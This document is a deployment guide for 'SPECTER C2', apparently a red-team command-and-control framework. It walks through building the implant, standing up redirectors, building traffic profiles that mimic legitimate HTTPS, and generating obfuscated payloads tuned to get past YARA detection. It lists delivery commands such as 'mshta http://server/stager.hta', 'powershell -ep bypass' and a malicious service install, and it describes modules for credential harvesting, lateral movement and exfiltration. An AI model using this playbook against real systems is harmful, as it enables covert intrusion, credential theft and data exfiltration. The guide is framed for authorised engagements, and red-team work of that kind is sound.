# Production Deployment Guide

End-to-end guide for deploying SPECTER C2 in a production engagement: from building the teamserver through generating and deploying implant payloads.

## Prerequisites

| Tool | Version | Purpose |
|------|---------|---------|
| Rust stable | 2021 edition | Teamserver and TUI client |
| Node.js | 18+ | Web UI build |
| MinGW-w64 | Latest | Implant cross-compilation (`x86_64-w64-mingw32-gcc`) |
| `protoc` + `buf` | Latest | Proto regeneration (only if changing .proto files) |
| Terraform | 1.0+ | Redirector deployment (optional) |
| OpenSSL | Any | Key generation |

## Overview

```
Phase 1: Build          → Compile teamserver, web UI, implant
Phase 2: Infrastructure  → Deploy teamserver, redirectors
Phase 3: Configure       → Create profiles, listeners, operators, campaigns
Phase 4: Payload         → Generate implant with embedded config
Phase 5: Operate         → Deploy implant, interact via TUI/web
```

---

## Phase 1: Build All Components

### 1.1 Teamserver + TUI Client

```bash
cargo build --workspace --release
```

Binaries output to `target/release/specter-server` and `target/release/specter-client`.

### 1.2 Web UI

```bash
cd web
npm install
npm run build
```

Static assets output to `web/dist/`. The teamserver can serve these via `--web-ui-dir`.

### 1.3 Implant PIC Blob

```bash
cd implant
make clean && make
make size    # Verify <20KB
```

Output: `implant/build/specter.bin` — the raw PIC blob used as a template by the payload builder.

**Ensure `specter.bin` is accessible to the teamserver.** The builder looks for it in the working directory or a configured template path.

---

## Phase 2: Deploy Infrastructure

### 2.1 Teamserver Setup

**Generate the CA master key** (store this securely — it protects the embedded CA private key):

```bash
export SPECTER_CA_KEY="$(openssl rand -hex 32)"
# Save this value! You'll need it every time the teamserver starts.
```

**Start the teamserver:**

```bash
./specter-server \
  --bind 0.0.0.0 \
  --grpc-port 50051 \
  --http-port 443 \
  --db-path /var/lib/specter/specter.db \
  --log-level info \
  --web-ui-dir /opt/specter/web/dist
```

| Flag | Default | Description |
|------|---------|-------------|
| `--bind` | `0.0.0.0` | Bind address |
| `--grpc-port` | `50051` | gRPC API port (operators connect here) |
| `--http-port` | `443` | HTTP listener port (implants connect here) |
| `--db-path` | `specter.db` | SQLite database path |
| `--log-level` | `info` | Log level: trace, debug, info, warn, error |
| `--dev-mode` | `false` | Skip auth (testing only) |
| `--web-ui-dir` | — | Serve web UI at `/ui/` from this directory |

On first startup, the server:
1. Creates the SQLite database and runs migrations
2. Creates a default `admin` operator and prints credentials to the console
3. Initializes the embedded CA (encrypts private key with `SPECTER_CA_KEY`)
4. Generates an X25519 keypair (logged to console — needed for manual implant config)
5. Generates an Ed25519 module signing keypair (logged to console)

**Save the printed admin credentials immediately — they won't be shown again.**

### 2.2 Deploy Redirectors (Optional)

Redirectors sit between implants and the teamserver, providing domain fronting and burn-ability.

#### Option A: VPS + NGINX (DigitalOcean/AWS)

```bash
cd infrastructure/terraform/modules/vps-nginx
terraform init
terraform apply \
  -var="provider_type=digitalocean" \
  -var="domain=cdn-assets.example.com" \
  -var="backend_url=https://teamserver.internal:443" \
  -var="uri_pattern=/api/v1/.*" \
  -var="do_region=nyc3" \
  -var="do_size=s-1vcpu-1gb"
```

This provisions a VPS with:
- NGINX reverse proxy
- Let's Encrypt TLS certificate
- URI-based traffic filtering (non-matching → decoy response)

#### Option B: Cloudflare Worker

```bash
cd infrastructure/terraform/modules/cloudflare-cdn
terraform init
terraform apply \
  -var="cloudflare_zone_id=your-zone-id" \
  -var="domain=static.example.com" \
  -var="backend_url=https://teamserver.internal:443" \
  -var="uri_pattern=/api/v1/.*"
```

Creates a Cloudflare Worker that filters and proxies matching traffic.

#### Option C: Manage via Web UI / gRPC

Use the **Redirectors** page in the web UI or the gRPC API (`DeployRedirector`, `ListRedirectors`, `GetRedirectorHealth`, `BurnRedirector`).

---

## Phase 3: Configure the Teamserver

### 3.1 Operator Authentication

**First-time setup (issue operator certificate):**

```bash
./specter-client \
  --server https://teamserver:50051 \
  --setup \
  --username alice \
  --role OPERATOR
```

This authenticates with the admin credentials, issues an mTLS certificate, and saves it to `~/.specter/`. Subsequent connections use the certificate automatically.

**Connect with mTLS:**

```bash
./specter-client \
  --server https://teamserver:50051 \
  --cert ~/.specter/operator.crt \
  --key ~/.specter/operator.key \
  --ca-cert ~/.specter/ca.crt
```

**Connect with token (alternative):**

```bash
./specter-client \
  --server https://teamserver:50051 \
  --token <api-token-from-authenticate-rpc>
```

**Web UI:** Navigate to `https://teamserver:50051/ui/` and log in with username + token (from the admin credentials printed at startup).

| Role | Permissions |
|------|-------------|
| `ADMIN` | Full access — manage operators, listeners, campaigns, all RPCs |
| `OPERATOR` | Queue tasks, interact with sessions, load modules, generate payloads |
| `OBSERVER` | Read-only — list/get sessions, tasks, subscribe to events |

### 3.2 Create a C2 Profile

Profiles shape how implant traffic appears on the wire. Create one via the **Profile Editor** in the web UI or the `CreateProfile` RPC.

**Example profile (`generic-https`):**

```yaml
name: "generic-https"
description: "HTTPS POST with Chrome TLS fingerprint"

tls:
  cipher_suites:
    - TLS_AES_128_GCM_SHA256
    - TLS_AES_256_GCM_SHA384
    - TLS_CHACHA20_POLY1305_SHA256
  extensions:
    - server_name
    - supported_versions
    - key_share
  alpn:
    - h2
    - http/1.1

http:
  request:
    method: POST
    uri_patterns:
      - "/api/v1/data"
      - "/api/v1/telemetry"
      - "/api/v1/events"
    headers:
      - name: User-Agent
        value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      - name: Content-Type
        value: "application/json"
      - name: Accept
        value: "application/json"
    body_template: '{"data":"{{data}}","timestamp":{{timestamp}}}'
    data_embed_points:
      - location: json_field
        field_name: "data"
        encoding: base64
  response:
    method: POST
    uri_patterns: ["/api/v1/data"]
    headers:
      - name: Content-Type
        value: "application/json"
      - name: X-Request-Id
        value: "{{request_id}}"
    body_template: '{"status":"ok","payload":"{{data}}"}'
    data_embed_points:
      - location: json_field
        field_name: "payload"
        encoding: base64
    status_code: 200

timing:
  callback_interval: 60
  jitter_distribution: uniform
  jitter_percent: 20.0

transform:
  compress: lz4
  encrypt: chacha20-poly1305
  encode: base64
```

**Working hours profile (limits check-ins to business hours):**

```yaml
timing:
  callback_interval: 60
  jitter_distribution: gaussian
  jitter_percent: 25.0
  initial_delay: 120
  working_hours:
    start_hour: 8
    end_hour: 18
    days: [mon, tue, wed, thu, fri]
    off_hours_multiplier: 4.0
```

### 3.3 Create a Listener

Listeners are the HTTP endpoints that implants connect to. Create one via the TUI, web UI, or gRPC API.

The listener must be configured with:
- **Bind address** and **port** matching where implants will connect
- **Profile** (optional) — applies traffic shaping rules to the listener

If you're using redirectors, the listener port should match whatever the redirector's backend URL points to.

### 3.4 Create a Campaign (Optional)

Campaigns group operators and sessions for access control:

1. Create campaign with name and description
2. Associate a listener
3. Add operators (with `FULL` or `READ_ONLY` access)
4. Sessions are assigned to campaigns as they check in

---

## Phase 4: Generate Implant Payloads

### Via Web UI (Recommended)

Navigate to the **Builder** page (`/ui/builder`):

1. **Select output format:**

   | Format | Extension | Use Case |
   |--------|-----------|----------|
   | `raw` | `.bin` | Shellcode injection (process hollowing, etc.) |
   | `dll` | `.dll` | DLL sideloading, `rundll32`, `LoadLibrary` |
   | `service_exe` | `.exe` | Windows service installation |
   | `dotnet` | `.exe` | Direct execution via .NET runtime |
   | `ps1_stager` | `.ps1` | PowerShell download cradle (high detection risk) |
   | `hta_stager` | `.hta` | HTML Application stager (high detection risk) |

2. **Select C2 profile** — choose from profiles created in step 3.2

3. **Add callback channels** — at least one required:
   - **Primary:** The main callback URL (e.g., `https://cdn-assets.example.com/api/v1/data`)
   - **Fallback:** Backup channels the implant rotates to on failure

4. **Configure sleep:**
   - Interval (seconds) — how often the implant checks in
   - Jitter (0–100%) — randomness applied to the interval

5. **Set kill date** (optional) — implant self-terminates after this date

6. **Enable obfuscation:**

   | Option | Effect |
   |--------|--------|
   | String Encryption | Re-encrypts embedded strings with a fresh XOR key |
   | API Hash Randomization | Randomizes the DJB2 hash salt |
   | Junk Code Insertion | Inserts NOP-equivalent sequences (configurable density 2–64) |
   | Control Flow Flattening | Heavy transform — significantly increases payload size |

7. **Format-specific options:**
   - **DLL:** Proxy target for export forwarding (e.g., `version.dll`)
   - **Service EXE:** Windows service name (default: `SpecterSvc`)
   - **Stagers:** Download URL where the full payload is hosted

8. Click **Generate Payload**

The response includes:
- **Payload binary** — download and deploy
- **Build ID** — for tracking and audit
- **Implant X25519 public key** — the teamserver uses this to derive session encryption keys
- **YARA warnings** — if any detection rules matched (iterate on obfuscation)

### Via gRPC API (Programmatic)

```bash
# Using grpcurl
grpcurl -plaintext -d '{
  "format": "dll",
  "profile_name": "generic-https",
  "channels": [
    {"kind": "https", "address": "https://cdn-assets.example.com/api/v1/data"}
  ],
  "sleep": {"interval_secs": 60, "jitter_percent": 20},
  "kill_date": 1735689600,
  "obfuscation": {
    "string_encryption": true,
    "api_hash_randomization": true,
    "junk_code_insertion": true,
    "junk_density": 16
  },
  "proxy_target": "version.dll"
}' localhost:50051 specter.v1.SpecterService/GeneratePayload
```

---

## Phase 5: Deploy and Operate

### 5.1 Deploy the Implant

Delivery depends on the engagement scope. Common approaches:

| Format | Delivery Method |
|--------|----------------|
| `raw` (.bin) | Process injection, reflective loading, shellcode runners |
| `dll` (.dll) | DLL sideloading (place next to vulnerable EXE), `rundll32` |
| `service_exe` (.exe) | `sc create SpecterSvc binPath= C:\path\to\payload.exe && sc start SpecterSvc` |
| `dotnet` (.exe) | Direct execution, `execute-assembly` from existing access |
| `ps1_stager` (.ps1) | `powershell -ep bypass -f stager.ps1` |
| `hta_stager` (.hta) | `mshta http://server/stager.hta` or social engineering |

### 5.2 Verify Check-in

Once deployed, the implant will check in after the configured initial delay (if set) plus the first sleep interval.

**In the TUI client:** Sessions appear in the session list with status `NEW` → `ACTIVE`.

**In the web UI:** The Dashboard shows new sessions; the Sessions page lists all active sessions with metadata (hostname, username, PID, OS, integrity level, IPs).

### 5.3 Interact with Sessions

**Queue tasks** via TUI console, web Session Interact page, or gRPC `QueueTask` RPC:

```
# TUI console examples
shell whoami
shell ipconfig /all
shell net user /domain
```

Tasks are queued and delivered on the next implant check-in. Results return on the following check-in.

**Load modules** for extended capabilities:

| Module Category | Capabilities |
|-----------------|-------------|
| `collect/` | System enumeration, credential harvesting |
| `inject/` | Process injection techniques |
| `lateral/` | Lateral movement (WMI, PsExec, etc.) |
| `token/` | Token impersonation and manipulation |
| `socks5/` | SOCKS5 proxy for pivoting |
| `exfil/` | Data exfiltration |

### 5.4 Monitor and Collaborate

- **Event stream:** Subscribe via gRPC `SubscribeEvents` or the web dashboard for real-time session/task events
- **Team chat:** Global and per-session chat channels in TUI and web UI
- **Operator presence:** See who is online and which session they're viewing
- **Webhooks:** Forward events to Slack, SIEM (GenericJSON), or security tools (CEF)
- **Audit log:** Tamper-proof SHA-256 hash-chained log of all operator actions

### 5.5 Generate Reports

Use the **Reports** page or `GenerateReport` RPC:
- Select campaign
- Choose format (Markdown or JSON)
- Select sections: timeline, IOC list, findings, recommendations
- Optionally filter by operator

---

## Operational Security Checklist

### Before Engagement
- [ ] Set `SPECTER_CA_KEY` environment variable (do not use DB path fallback)
- [ ] Deploy at least one redirector between teamserver and targets
- [ ] Create a C2 profile that matches legitimate traffic for the target environment
- [ ] Set appropriate kill dates on all implants
- [ ] Configure working hours if applicable
- [ ] Enable string encryption and API hash randomization at minimum
- [ ] Run YARA scan on generated payloads — iterate if detections found
- [ ] Create separate campaigns for different objectives/targets

### During Engagement
- [ ] Monitor redirector health — burn and rotate if detected
- [ ] Use appropriate sleep intervals (shorter = more responsive but noisier)
- [ ] Review audit log periodically for unauthorized actions
- [ ] Use per-session chat channels to coordinate operator activity
- [ ] Back up the SQLite database regularly

### After Engagement
- [ ] Generate final engagement report
- [ ] Verify all implants have passed their kill dates or are manually removed
- [ ] Destroy redirector infrastructure
- [ ] Export and archive audit log
- [ ] Securely delete database and CA keys

---

## Testing with Mock Implants

For testing without real implants:

```bash
cargo run -p mock-implant -- \
  --server http://127.0.0.1:443 \
  --count 5 \
  --interval 10 \
  --jitter 20
```

| Flag | Default | Description |
|------|---------|-------------|
| `--server` | `http://127.0.0.1:443` | Teamserver HTTP listener URL |
| `--count` | `1` | Number of simulated implants |
| `--interval` | `10` | Check-in interval (seconds) |
| `--jitter` | `20` | Jitter percentage (0–100) |
| `--hostname` | (random) | Override hostname (single implant only) |
| `--username` | (random) | Override username (single implant only) |

Mock implants generate randomized host metadata and return mock task results.

---

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| Web UI shows HTTP 400 on login | Transport mismatch | Verify `web/src/lib/transport.ts` uses `createGrpcWebTransport` (not `createConnectTransport`) |
| CA warning on startup | `SPECTER_CA_KEY` not set | Set the environment variable before starting |
| Implant doesn't check in | Wrong callback URL or port | Verify listener is running and URL matches profile URI patterns |
| "Token store lock poisoned" | Previous panic in auth path | Restart teamserver (lock is unrecoverable) |
| YARA warnings on payload | Signatures detected | Enable additional obfuscation options, iterate |
| WebSocket channel returns empty | — | WebSocket handler is fully functional; check wire format and session key derivation |
| Tasks not delivered | Session is STALE/DEAD | Check implant sleep interval; session status updates every 5 seconds |
